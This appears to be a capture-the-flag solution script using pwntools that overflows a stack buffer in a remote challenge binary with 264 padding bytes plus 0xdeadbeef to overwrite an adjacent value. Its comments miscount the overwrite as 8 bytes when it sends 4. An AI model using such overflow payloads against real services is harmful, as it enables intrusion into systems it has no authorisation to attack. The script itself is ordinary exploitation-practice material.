from pwn import *

host = 'HOST_HERE' #Host to connect to
port = PORT_HERE #Port to connect to

padding = b'A' * 264 #Sending 264 A's to get to our ourflow and to act as padding. We overflow the buffer at 272
rbp = b'\xef\xbe\xad\xde' #We are sending 8 bytes here. So we do 272 - 8 and we get 264 + out bytes to get to the buffer overflow

payload = padding + rbp #Creating our payload

#connect = process('./chall')
connect = remote(host,port) #Connecting to remote server
connect.sendlineafter(b'\n', payload) #Sending the payload after we get the new line
output = connect.recvall() #Collecting our data
print(output) #Printing
